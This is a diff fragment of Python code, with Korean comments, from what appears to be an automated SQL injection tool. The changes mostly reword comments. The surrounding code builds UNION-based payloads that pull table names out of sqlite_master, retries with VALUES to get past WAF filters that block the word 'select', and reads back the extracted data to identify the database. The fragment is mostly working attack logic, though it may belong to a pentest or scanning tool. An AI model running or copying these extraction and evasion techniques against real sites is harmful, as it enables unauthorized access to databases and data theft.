-            # VALUES로 바꿔두면 바깥쪽 SELECT 때문에 걸리는 경우는 구제된다.
+            # SQLite는 current_db 개념이 없어(SQL_DIALECTS 참고) db_name 단계를 건너뛰고 바로 테이블
+            # 목록으로 간다. sqlite_master가 MySQL의 information_schema.tables 역할을 한다. 단, 이 expr
+            # 자체가 sqlite_master를 읽는 중첩 SELECT를 포함해 select 단어 필터는 VALUES로도 못 피한다
+            # (테이블을 읽으려면 SELECT가 필요) — 그래도 바깥쪽 UNION만이라도 VALUES로 바꿔두면 바깥
+            # SELECT 때문에 걸리는 경우는 구제된다.
             table_lit = self._dialect_bytes_literal(dialect, b'table')
             table_expr = f"(SELECT group_concat(name) FROM sqlite_master WHERE type={table_lit})"
             targets = [('tables', table_expr)]
@@ -1951,8 +1845,8 @@ class SQLiStrategy(BaseStrategy):
                 surface, base_fields, _build(expr), f'enum(union-extract:{label})', waf_hits, waf_evasions,
             )
             if status is None and clean == 'SQLite':
-                # _go_union_reflect와 같은 이유 — "select" 단어 자체를 필터링하는 사이트에서는
-                # 바깥쪽 UNION SELECT를 VALUES로 바꿔서 재시도한다.
+                # _go_union_reflect와 같은 이유 — select 단어 자체를 필터링하는 사이트에서는 바깥쪽
+                # UNION SELECT를 VALUES로 바꿔 재시도한다.
                 status, body, _, used_payload, _ = self._send_evading(
                     surface, base_fields, _build(expr, use_values=True), f'enum(union-extract-values:{label})',
                     waf_hits, waf_evasions,
@@ -1962,11 +1856,10 @@ class SQLiStrategy(BaseStrategy):
             match = re.search(r'~~([^~<]{1,256})~~', body)
             print(f"    [UnionExtract] label={label} status={status} match={match and match.group(1)}")
             if match:
-                # 이 추출이 성공한 브랜치의 방언 = 확정 지문. _fingerprint_db가 Unknown으로
-                # 실패했어도(예: uid 동등비교라 AND 기반 버전-LIKE 판별이 참/거짓을 못 가르는
-                # 앱), UNION 추출이 실제로 성공했다는 것 자체가 가장 강한 근거라 여기서
-                # detected_db를 확정한다(추가 요청 0). 그래야 요약에 'DB : MySQL' 등이 뜨고,
-                # blind를 안 탄 UNION 경로에서도 방언이 공란으로 남지 않는다.
+                # 이 추출이 성공한 브랜치의 방언 = 확정 지문. 방언 판별이 Unknown으로 실패했어도(uid
+                # 동등비교라 버전-LIKE 판별이 참/거짓을 못 가르는 앱 등), UNION 추출이 실제로 성공했다는
+                # 것 자체가 가장 강한 근거라 여기서 detected_db를 확정한다(추가 요청 0). 그래야 요약에
+                # DB명이 뜨고, blind를 안 탄 UNION 경로에서도 방언이 공란으로 남지 않는다.
                 if vuln_entry.get('detected_db') in (None, 'Unknown'):
                     vuln_entry['detected_db'] = clean if clean in ('SQLite', 'PostgreSQL') else 'MySQL'
                 if label == 'db_name':
